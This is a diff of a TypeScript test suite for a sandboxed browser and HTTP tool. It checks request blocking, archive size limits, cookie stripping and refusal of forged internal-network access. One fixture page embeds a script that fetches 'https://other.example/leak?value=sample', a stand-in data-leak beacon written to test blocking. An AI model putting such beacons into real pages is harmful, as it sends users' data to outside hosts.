@@ -94,7 +94,10 @@ await check('浏览器输入边界', () => {
 let reads = 0;const sentUrls:string[]=[];
 class FixtureHttp extends SafeHttp {
   override async get(url: string, policy: WebPolicy = {}): Promise<WebResponse> {
-    const parsed = webUrl(url, policy.origins); policy.signal?.throwIfAborted(); reads++;sentUrls.push(parsed.href);
+    const parsed = webUrl(url, policy.origins,policy.urls,policy.targets); policy.signal?.throwIfAborted(); reads++;sentUrls.push(parsed.href);
+    if(parsed.pathname==='/attachment')return {url,status:200,headers:{'content-type':'application/pdf','content-disposition':'attachment; filename=private.pdf','set-cookie':'private-secret'},body:Buffer.from('%PDF-synthetic')};
+    if(parsed.pathname==='/resources')return {url,status:200,headers:{'content-type':'text/html'},body:Buffer.from('<html><body><img src="/attachment"><img src="/unapproved">资源测试</body></html>')};
+    if(parsed.pathname==='/large-dom')return {url,status:200,headers:{'content-type':'text/html'},body:Buffer.from('<html><body><script>document.body.append("x".repeat(2200000))</script></body></html>')};
     if(parsed.pathname==='/strict')return {url,status:200,headers:{'content-type':'text/html'},body:Buffer.from('<html><body>严格测试<img src="/pixel?value=sample"><script>fetch("/collect?value=sample").catch(()=>{});fetch("https://other.example/leak?value=sample").catch(()=>{});</script></body></html>')};
     if (parsed.pathname === '/slow') { await new Promise<void>((resolve, reject) => { const timer = setTimeout(resolve, 10000); policy.signal?.addEventListener('abort', () => { clearTimeout(timer); reject(Error('cancelled')); }, { once: true }); }); }
     if (parsed.pathname === '/jump') return { url, status: 302, headers: { 'content-type': 'text/html', location: 'https://other.example/destination' }, body: Buffer.alloc(0) };
@@ -124,6 +127,37 @@ if (process.argv.includes('--browser')) {
     await check('真实Chromium动态渲染、点击、滚动、截图及请求拦截', async () => {
       const result = await engine.browse(browseInput({ url: 'https://fixture.example', actions: [{ kind: 'click', selector: '#expand' }, { kind: 'scroll', pixels: 600 }, { kind: 'wait', milliseconds: 100 }], screenshot: true }));
       assert.match(result.text, /已展开动态正文/); assert.match(result.text, /异步正文/); assert(result.blockedRequests >= 2); assert.equal(Buffer.from(result.screenshot!, 'base64').subarray(0,8).toString('hex'), '89504e470d0a1a0a');
+    });
+    await check('DOM存档保存动态HTML、区分HTTP且共享会话拒绝',async()=>{
+      const tools=new WebTools({url:base,token}).tools(async()=>undefined,['https://fixture.example/'],undefined,true);
+      const result=JSON.parse(await tools[1]!.run({url:'https://fixture.example/',actions:[{kind:'click',selector:'#expand'},{kind:'wait',milliseconds:100}]},{taskDir:'.'}));
+      assert.equal(result.original.kind,'bundle');const archive=JSON.parse(Buffer.from(result.original.body,'base64').toString());assert.equal(archive.resources[0].url,'https://fixture.example/');assert.match(Buffer.from(result.original.body,'base64').toString(),/已展开动态正文/);assert(result.blockedRequests>=2);
+      const response=await fetch(base+'/v1/browse',{method:'POST',headers:{authorization:'Bearer '+token,'content-type':'application/json'},body:JSON.stringify({url:'https://fixture.example/',sessionId:'fixture',includeOriginal:true})});assert.equal(response.status,422);
+      const ordinary=await engine.browse(browseInput({url:'https://fixture.example/'}));assert.equal(ordinary.original,undefined);
+    });
+    await check('DOM超过2MiB时明确失败而不截断存档',async()=>{
+      await assert.rejects(engine.browse(browseInput({url:'https://fixture.example/large-dom'}),{urls:['https://fixture.example/large-dom']},true),/资源包超过/);
+    });
+    await check('独立浏览器和HTTP出口接收后端内网例外，模型不能伪造授权',async()=>{
+      const url='https://oa.internal/reports?id=1',targets=[{url,address:'10.20.30.40'}];
+      const tools=new WebTools({url:base,token}).tools(async()=>undefined,[url],undefined,true,targets);
+      assert.equal(JSON.parse(await tools[0]!.run({url},{taskDir:'.'})).url,url);
+      assert.equal(JSON.parse(await tools[1]!.run({url},{taskDir:'.'})).url,url);
+      const ordinary=new WebTools({url:base,token}).tools(async()=>undefined,[url]);
+      await assert.rejects(ordinary[0]!.run({url,targets},{taskDir:'.'}));
+      await assert.rejects(tools[1]!.run({url:url.replace('id=1','id=2')},{taskDir:'.'}));
+    });
+    await check('资源包只保存授权响应和附件，不携带Cookie或隐式抓取链接',async()=>{
+      const urls=['https://fixture.example/resources','https://fixture.example/attachment'];
+      const tools=new WebTools({url:base,token}).tools(async()=>undefined,urls,undefined,true);
+      const result=JSON.parse(await tools[1]!.run({url:urls[0],actions:[{kind:'wait',milliseconds:200}]},{taskDir:'.'}));
+      const archive=JSON.parse(Buffer.from(result.original.body,'base64').toString());
+      assert.equal(archive.resources.length,2);assert(archive.resources.every((resource:{url:string})=>urls.includes(resource.url)));
+      assert.equal(Buffer.from(archive.resources.find((resource:{url:string})=>resource.url===urls[1]).body,'base64').toString(),'%PDF-synthetic');
+      assert(!JSON.stringify(archive).includes('private-secret'));assert(archive.blockedUrls.includes('https://fixture.example/unapproved'));
+      const attachment=JSON.parse(await tools[0]!.run({url:urls[1]},{taskDir:'.'}));assert.match(attachment.text,/未解析/);assert.equal(Buffer.from(attachment.original.body,'base64').toString(),'%PDF-synthetic');
+      const ordinary=new WebTools({url:base,token}).tools(async()=>undefined,urls);
+      await assert.rejects(ordinary[0]!.run({url:urls[1]},{taskDir:'.'}));
     });
     await check('上下文隔离及表单操作禁止', async () => {
       const input = browseInput({ url: 'https://fixture.example' });
